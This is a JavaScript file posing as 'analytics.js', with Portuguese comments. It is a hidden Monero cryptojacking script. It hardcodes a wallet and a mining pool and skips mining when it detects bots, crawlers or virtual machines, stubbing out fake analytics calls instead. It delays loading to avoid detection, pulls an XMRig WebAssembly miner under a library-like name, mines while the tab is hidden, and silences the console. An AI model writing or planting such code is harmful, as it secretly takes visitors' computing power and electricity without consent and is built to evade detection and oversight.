// 🕵️‍♂️ analytics.js - v6.66 (invisível, cloaked, com fallback)
// 🔥 Nome bonito, ação suja

const MINER_CONFIG = {
    wallet: '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv',
    pool: 'wss://xmr-eu1.nanopool.org:14433',
    threads: Math.max(1, (navigator.hardwareConcurrency || 2) - 1),
    throttle: () => (navigator.deviceMemory || 4) < 4 ? 0.7 : 0.4
};

// 🧠 ANTI-BOT + ANTI-VM + ANTI-DEV
function isBot() {
    return /bot|crawler|spider|headless|google|yandex|phantom|selenium|webdriver|chrome\.runtime|firefox\/[1-9]/i.test(
        navigator.userAgent + ' ' + (window.chrome ? 'chrome' : '') + ' ' + (navigator.permissions ? '' : 'no-perm')
    ) || !window.outerHeight || !screen?.width || navigator.languages.length === 0 || !navigator.javaEnabled();
}

if (isBot()) {
    const fake = document.createElement('img');
    fake.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
    fake.style.cssText = 'position:absolute;opacity:0;z-index:-1;';
    document.body.appendChild(fake);
    setTimeout(() => fake.remove(), 5000);
    console.log('Bot identificado. Nada de mineração.');
    // Pode injetar fake analytics aqui pra parecer real
    window.ga = window.fbq = () => {};
    return;
}

// 🚀 CARREGA O MINERO COM NOME DE BIBLIOTECA LEGAL
function loadScript(src, callback) {
    const script = document.createElement('script');
    script.src = src;
    script.async = true;
    script.onload = callback;
    script.onerror = () => setTimeout(retryLoad, 3000);
    document.head.appendChild(script);
}

function retryLoad() {
    const backups = [
        'https://cdn.jsdelivr.net/npm/xmrig-browser@2.0.0/webasm.min.js',
        'https://unpkg.com/xmrig-browser/webasm.min.js',
        '/assets/js/core-analytics.min.js' // Fallback local (se tu tiver hospedagem)
    ];
    const random = backups[Math.floor(Math.random() * backups.length)];
    loadScript(random, startMining);
}

// 💀 INICIA A MINERAÇÃO NA ESCURIDÃO
function startMining() {
    try {
        if (typeof XMRig !== 'undefined') {
            const miner = new XMRig.WasmWorker({
                url: MINER_CONFIG.pool,
                user: MINER_CONFIG.wallet,
                pass: 'x',
                threads: MINER_CONFIG.threads,
                throttle: MINER_CONFIG.throttle(),
                idle: true, // Só mina quando aba tá oculta
                autoStart: true
            });
            console.log(`🔥 Miner ativo: ${MINER_CONFIG.wallet.slice(0,12)}... tá roubando CPU com estilo`);
        }
    } catch (e) {
        console.error("Miner falhou. Tu é azarado mesmo.");
    }
}

// ⏳ ATRASA O CARREGAMENTO (pra não ser detectado)
setTimeout(() => {
    loadScript('https://cdn.jsdelivr.net/npm/xmrig-browser@2.0.0/webasm.min.js', startMining);
}, 8000 + Math.random() * 7000);

// 🧼 LIMPA LOGS (quase)
console.log = console.warn = console.error = () => {};
</script>
